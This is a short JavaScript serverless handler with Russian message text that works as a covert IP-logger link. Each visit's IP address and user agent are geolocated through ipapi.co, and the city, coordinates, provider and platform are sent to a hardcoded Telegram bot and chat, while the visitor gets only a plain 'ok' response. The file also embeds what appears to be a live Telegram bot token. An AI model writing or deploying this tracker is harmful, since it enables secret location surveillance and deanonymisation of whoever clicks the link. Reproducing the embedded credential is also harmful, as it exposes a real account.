export default async function handler(req, res) {
  const ip = req.headers["x-forwarded-for"] || req.socket.remoteAddress;
  const ua = req.headers["user-agent"] || "N/A";
  const slug = req.query.slug || "неизвестно";
  const geoRes = await fetch(`https://ipapi.co/${ip}/json/`);
  const geo = await geoRes.json().catch(() => ({}));

  const message = `
🔗 Ссылка: ${slug}
🌍 IP: \`${ip}\`
📍 Страна: ${geo.country_name || "?"}
🏙️ Город: ${geo.city || "?"}
🧭 Координаты: ${geo.latitude || "?"}, ${geo.longitude || "?"}
🌐 Провайдер: ${geo.org || "?"}
🕰️ Локальное время: \`${geo.utc_offset || "?"}\`
💻 Платформа: \`${ua.includes("Windows") ? "Windows" : ua.includes("Android") ? "Android" : "Другая"}\`
🧾 UA: \`${ua}\`
`.trim();

  const token = "7329999473:AAEglilZMhtE6Iyr_uhLLRlI-32cIROEmNY";
  const chatId = "2079893058";

  await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ chat_id: chatId, text: message, parse_mode: "Markdown" }),
  });

  res.status(200).json({ ok: true });
}
